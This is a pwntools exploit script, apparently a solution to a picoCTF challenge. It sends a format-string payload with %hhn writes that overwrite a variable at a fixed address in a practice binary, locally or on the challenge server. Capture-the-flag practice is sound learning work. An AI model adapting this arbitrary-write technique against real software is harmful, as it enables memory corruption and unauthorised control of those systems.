#!/usr/bin/env python3

from pwn import *

context.binary = "./vuln"

if args.DEBUG:
    context.log_level = 'DEBUG'

if args.REMOTE:
    p = remote("rhea.picoctf.net",53201)
else:
    p = process()

context.gdb_binary = "pwndbg"
if args.TMUX:
    context.terminal = ['tmux', 'split-pane', '-h']
if args.GDB and not args.REMOTE:
    gdb.attach(p)

p.recvuntil(b"ave to say?")
sus_addr = 0x404060

fms_str = b"%97c%20$hhn%5c%21$hhnA%22$hhn%5c%23$hhn"
fms_str += b"A"*(13-(len(fms_str)//8)) + p64(sus_addr+2) + p64(sus_addr) +p64(sus_addr+3) + p64(sus_addr+1)

p.sendline(fms_str)

p.interactive()
